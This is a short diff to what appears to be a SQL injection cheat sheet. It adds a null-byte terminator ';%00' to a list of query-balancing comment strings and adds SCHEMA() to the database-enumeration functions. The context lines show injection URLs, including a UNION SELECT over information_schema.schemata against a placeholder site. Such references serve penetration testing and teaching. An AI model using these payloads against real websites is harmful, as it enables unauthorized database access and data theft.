@@ -18,7 +18,7 @@
 
 ### 2) Fix the Query.
 - after breaking the query, we've to fix the query. So, we can **balance** the **SQL QUERY**.
-- So, for that we can use ``` --, --+, -- -, #, --#, ., -, /*, '), "), `), ')), ")),`)), ') -- ```
+- So, for that we can use ``` --, --+, -- -, #, --#, ., -, /*, '), "), `), ')), ")),`)), '), ;%00 ```
 - example,
    - https://website.com/product/id?=23' --
    - https://website.com/product/id?=23' --+
@@ -96,6 +96,7 @@
 - **get the database**
    - https://website.com/product/id?=23' UNION SELECT NULL,concat(schema_name), NULL FROM information_schema.schemata--
    ```
+   SCHEMA()
    DATABASE()
    SELECT CONCAT(DB) FROM INFORMATION_SCHEMA.PROCESSLIST
    ```
